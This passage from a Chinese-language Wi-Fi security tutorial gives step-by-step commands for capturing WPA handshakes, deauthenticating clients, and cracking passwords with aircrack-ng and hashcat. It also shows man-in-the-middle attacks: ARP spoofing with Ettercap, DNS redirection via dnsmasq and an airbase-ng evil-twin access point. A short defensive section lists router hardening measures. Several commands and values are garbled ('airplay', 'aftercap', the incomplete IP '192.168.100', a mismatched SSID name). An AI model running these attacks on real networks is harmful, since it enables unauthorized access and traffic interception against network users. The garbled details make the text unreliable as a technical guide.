    字典攻击使用预定义的常用密码或单词列表作为密码。这种方法比暴力破解更快，但取决于词汇列表的质量。


    ## 词汇表创建

    要创建自定义词汇表，可以使用 `Crunch` 等工具：


    ```bash

    sudo apt install crunch

    crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -o
    wordlist.txt

    ```


    该命令创建了一个长度在 8 到 12 个字符之间的单词列表，并使用了大写字母、小写字母和数字。


    ## 使用 `Hashcat`

    ```bash

    hashcat -m 2500 -a 0 capture.hccapx wordlist.txt

    ```


    # 密码破解防护


    保护您的 Wi-Fi 网络免受密码破解攻击对于维持安全至关重要。以下是安全网络的一些最佳实践。


    ## 强且复杂的密码

    使用长且复杂的密码，包含大小写字母、数字和特殊字符的组合。避免使用常用单词或个人信息。


    强密码示例：


    ```

    3x@mpl3P@$$w0rd!

    ```


    ## 定期更新密码

    定期更改密码以缩短攻击者的机会窗口。


    ## 使用 WPA3

    与 WPA2 相比，WPA3 提供了显著的安全改进，包括对暴力破解攻击更好的防护。


    - `WPA3 配置`：访问路由器管理界面并将安全协议更改为 `WPA3`。如果不支持 `WPA3`，请使用带有强密码的 `WPA2`


    ## 禁用 WPS

    在您的路由器上禁用 Wi-Fi 安全设置（`WPS`），以防止利用此漏洞的攻击。


    - `禁用 WPS`：访问路由器管理界面并禁用 `WPS` 选项。


    ## MAC 过滤

    实施 MAC 地址过滤，仅允许授权设备接入网络。


    - `MAC 过滤配置`：访问路由器管理界面，并通过添加授权设备的 MAC 地址来配置 MAC 地址过滤。


    ## 网络分段

    通过隔离不同类型的流量和设备，网络分段可以限制攻击的影响。


    - `VLAN 的使用`：在路由器上配置 `VLAN` 以隔离关键设备和通用设备的流量。


    ## 监控与检测

    实施监控系统以检测密码破解尝试和其他可疑活动。


    - `IDS/IPS 的使用`：可以配置 `Snort` 或 `Zeek` 等工具监控网络流量，并在出现可疑活动（如密码破解尝试）时报警。


    # 密码破解的实际示例


    为了说明讨论的工具和技术如何在实践中应用，这里是执行密码破解攻击的示例。


    ## 使用 `Airodump-ng` 捕获握包


    将接口（Interface）置于监听模式（Monitor Mode）：


    ```bash

    sudo airmon-ng start wlan0

    ```


    捕获握包（Handshake）：


    ```bash

    sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

    ```


    强制取消认证以捕获握包：


    ```bash

    sudo airplay --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

    ```


    ## 使用 `Aircrack-ng` 破解密码


    字典文件用法：


    ```bash

    sudo aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap

    ```


    使用 `Aircrack-ng` 进行暴力破解：创建一个包含所有可能组合的密码列表文件，并配合 `Aircrack-ng` 使用：


    ```bash

    crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -o
    brute-force-list.txt

    sudo aircrack-ng -w brute-force-list.txt -b 00:11:22:33:44:55 capture-01.cap

    ```


    ## 使用 `Hashcat`


    将握包转换为 `Hashcat` 格式：


    ```bash

    hcxpcaptool -z capture.hccapx capture-01.cap

    ```


    使用 `Hashcat` 破解密码：


    ```bash

    hashcat -m 2500 capture.hccapx wordlist.txt

    ```


    Wi-Fi 密码破解是一项关键技术，涉及多种方法，包括捕获握包、暴力破解和字典攻击，以及使用如 `Aircrack-ng`、`Hashcat` 和 `John
    the Ripper` 等专门工具。保护网络免受这些攻击需要实施强且复杂的密码、定期更新密码、使用 `WPA3`、禁用 `WPS`、MAC 过滤、网络分段以及持续监控。理解并应用这些技术使网络安全人员有效地保护
    Wi-Fi 网络，确保数据安全和网络完整性。


    # 第 6 章：中间人攻击


    ## MITM 攻击简介


    中间人攻击（`MITM`）是 Wi-Fi 网络上最严重且常见的威胁之一。在 `MITM` 攻击中，攻击者在双方不知情的情况下截获并可能修改他们之间的通信。这允许攻击者窃取敏感信息（如登录凭据和个人数据），或向通信中注入恶意数据。


    ## MITM 攻击概念


    当攻击者置于两个通信的设备之间时，就会发生 `MITM` 攻击。攻击者可以拦截、记录并更改这些设备之间传输的数据。执行 `MITM` 攻击有多种技术，包括
    `ARP 欺骗`（`ARP spoofing`）。


    ## 在 Wi-Fi 网络上执行 MITM


    为了在 Wi-Fi 网络上执行 `MITM` 攻击，攻击者必须获得网络访问权限。连接后，攻击者可以使用各种技术拦截流量。


    ## ARP 欺骗


    `ARP`（地址解析协议）欺骗是 `MITM` 攻击中的常用技术。`ARP` 欺骗涉及发送伪造的 `ARP` 消息，将攻击者的 MAC 地址与合法设备的 IP
    地址关联。


    - 使用 Ettercap：`Ettercap` 是执行 `ARP 欺骗` 的工具。


    安装：


    ```bash

    sudo apt install aftercap-graphical

    ```


    执行：以图形模式启动 `Ettercap`：


    ```bash

    sudo aftercap -G

    ```


    1. 选择网络接口并开始嗅。

    2. 添加受害者（目标设备）并选择 `ARP 投毒` 作为攻击方法。

    3. 启动攻击


    ## DNS 重定向


    DNS 重定向通过操作 DNS 响应将流量重定向到攻击者控制的恶意网站。


    - 使用 Dnsmasq：`Dnsmasq` 是一个可以配置提供 DNS 和 DHCP 服务的工具，有助于 DNS 重定向。


    安装：


    ```bash

    sudo apt install dnsmasq

    ```


    设置：编辑 `Dnsmasq` 配置文件（/etc/dnsmasq.conf）以添加重定向项：


    ```

    address=/example.com/192.168.100

    ```


    在此示例中，对 `example.com` 的任何请求都将重定向到 `192.168.100`，即恶意服务器的 IP 地址。


    ## 创建伪访问点


    创建伪访问点（“邪恶攻击”）是另一种 `MITM` 攻击技术。攻击者创建一个与合法访问点相同的 SSID，诱骗用户连接到伪访问点。


    - 使用 Airbase-ng：`Airbase-ng` 是 `Aircrack-ng` 软件包中的一个工具，用于创建伪访问点。


    安装：


    ```bash

    sudo apt install aircrack-ng

    ```


    执行：将网络接口置于监听模式：


    ```bash

    sudo airmon-ng start wlan0

    ```


    创建伪访问点：


    ```bash

    sudo airbase-ng -e "NomeDoSSID" wlan0mon

    ```


    该命令创建一个 SSID 为 "SSIDName" 的访问点。连接到此访问点的用户的流量将被攻击者拦截。


    # 用于 MITM 攻击的工具


    多种工具可以方便地在 Wi-Fi 网络上执行 `MITM` 攻击。一些流行的工具包括 `Ettercap`、`Wireshark` 和 `MITMf`。


    # Ettercap


    `Ettercap` 是一种网络嗅探和欺骗工具，支持多种 `MITM` 技术，包括 `ARP 欺骗` 和数据注入。


